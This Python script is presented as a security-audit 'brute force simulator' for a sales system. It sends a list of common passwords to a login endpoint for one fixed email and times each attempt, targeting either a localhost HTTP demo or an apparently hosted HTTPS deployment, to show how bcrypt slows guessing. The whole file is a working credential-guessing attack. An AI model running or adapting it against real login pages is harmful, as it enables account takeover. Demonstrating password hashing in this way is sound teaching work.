import requests
import time

TARGETS = {
    "1": {
        "label": "HTTP / Insecure Demo",
        "url": "http://localhost:5000/login"
    },
    "2": {
        "label": "HTTPS / Secure Login with bcrypt",
        "url": "https://ee-sales-system.onrender.com/login"
    }
}

email = "miguel@example.com"

print("========================================================")
print("E&E SALES SYSTEM SECURITY AUDIT - BRUTE FORCE SIMULATOR")
print("========================================================")
print("1. Target Output 1: Vulnerable System (HTTP)")
print("2. Target Output 2: Secured System (HTTPS + bcrypt)")
print("--------------------------------------------------------")

choice = input("Select your target environment (1 or 2): ").strip()

if choice not in TARGETS:
    print("Invalid choice. Please run the script again and choose 1 or 2.")
    exit()

target = TARGETS[choice]

print(f"\n[*] INITIATING ATTACK ON: {target['url']}")
print(f"[*] Target Username: {email}\n")

password_list = [
    "123456",
    "password",
    "admin",
    "admin123",
    "qwerty",
    "Password1212",
    "welcome",
    "test123"
]

times = []
success_found = False

for password in password_list:
    start = time.perf_counter()

    try:
        response = requests.post(
            target["url"],
            json={
                "email": email,
                "password": password
            },
            timeout=15
        )

        end = time.perf_counter()
        elapsed = end - start
        times.append(elapsed)

        if response.status_code == 200:
            print(f"[SUCCESS] Password: '{password}' | Time to compute: {elapsed:.3f} seconds")
            success_found = True
            break
        else:
            print(f"[FAILED]  Password: '{password}' | Time to compute: {elapsed:.3f} seconds")

    except requests.exceptions.RequestException as e:
        end = time.perf_counter()
        elapsed = end - start
        print(f"[ERROR]   Password: '{password}' | Connection failed | {str(e)}")

if len(times) > 0:
    avg = sum(times) / len(times)
    print(f"\n[*] Average time per guess: {avg:.3f} seconds")
else:
    print("\n[*] No successful requests were sent, so average time cannot be computed.")

if success_found:
    print("[*] Attack Simulation Complete. Password was found.")
else:
    print("[*] Attack Simulation Complete. Password was not found.")